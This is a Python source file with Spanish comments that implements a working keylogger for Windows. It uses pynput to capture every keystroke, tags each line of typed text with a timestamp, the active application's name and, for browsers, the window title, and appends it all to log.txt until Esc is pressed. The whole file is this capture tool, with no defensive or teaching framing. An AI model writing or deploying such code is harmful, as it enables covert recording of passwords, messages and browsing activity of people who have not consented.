from pynput.keyboard import Key, Listener
from datetime import datetime
import psutil
import platform
import pygetwindow as gw
import win32gui
import win32process

log_filename = "log.txt"
current_text = [] 

# Función para obtener la aplicación activa

def aplicacion_activa():
    if platform.system() == 'Windows':

        window = win32gui.GetForegroundWindow()
        pid = win32process.GetWindowThreadProcessId(window)[-1]
        proceso = psutil.Process(pid)
        nombre_aplicacion = proceso.name()
        titulo_ventana = win32gui.GetWindowText(window)
        return nombre_aplicacion, titulo_ventana
    elif platform.system() == 'Linux':
        pass
    elif platform.system() == 'Darwin':
        pass
    return None, None

# Función para navegador

def detectar_navegador(nombre_aplicacion, titulo_ventana):
    navegadores = ['chrome.exe', 'firefox.exe', 'msedge.exe', 'opera.exe', 'opera_gx.exe', 'brave.exe']
    if nombre_aplicacion.lower() in navegadores:
        ventanas = gw.getWindowsWithTitle(titulo_ventana)
        if ventanas:
            return ventanas[0].title  #Titulo de la ventana del navegador como retorno
        return None



# Función de fecha y hora
def iniciar_log():
    with open(log_filename, 'a', encoding='utf-8') as logfile:
        logfile.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}:\n")



def presionar_tecla(key):
    global current_text

    if key == Key.space:
        current_text.append(" ")
    elif key == Key.enter:
        guardar_texto_con_fecha()  # Guardar el texto acumulado con la aplicación y el navegador
    elif key == Key.backspace:
        if current_text:
            current_text.pop()  # Borrar el último carácter
    elif key == Key.esc:
        guardar_texto_con_fecha()  # Guardar lo que hay antes de salir
        return False  # Detener el listener
    else:
        try:
            current_text.append(key.char)  # Agregar el carácter al texto
        except AttributeError:
            pass

# Guardar el texto con la fecha y hora al presionar Enter
def guardar_texto_con_fecha():
    if current_text:  

        nombre_aplicacion, titulo_ventana = aplicacion_activa()
        ventana_navegador = detectar_navegador(nombre_aplicacion, titulo_ventana)

        with open(log_filename, 'a', encoding='utf-8') as logfile:
            logfile.write("".join(current_text))
            logfile.write("".join("\n"))
            logfile.write(f"App: {nombre_aplicacion}\n")
            if ventana_navegador:
                logfile.write(f"Navegador: {titulo_ventana}\n")

        current_text.clear()  
    with open(log_filename, 'a', encoding='utf-8') as logfile:

        logfile.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}:\n")

# Actualizar el archivo en tiempo real solo cuando se presiona una tecla
def actualizar_log(borrado=False):
    with open(log_filename, 'r+', encoding='utf-8') as logfile:
        logfile.seek(0, 2)  # Mover al final
        if borrado:
            if logfile.tell() > 0:
                logfile.seek(logfile.tell() - 1) 
                logfile.truncate()  # Eliminar el último carácter
        else:
            if current_text: 
                logfile.write(current_text[-1])  

# Iniciar el listener
iniciar_log() 
with Listener(on_press=presionar_tecla) as listener:
    listener.join()

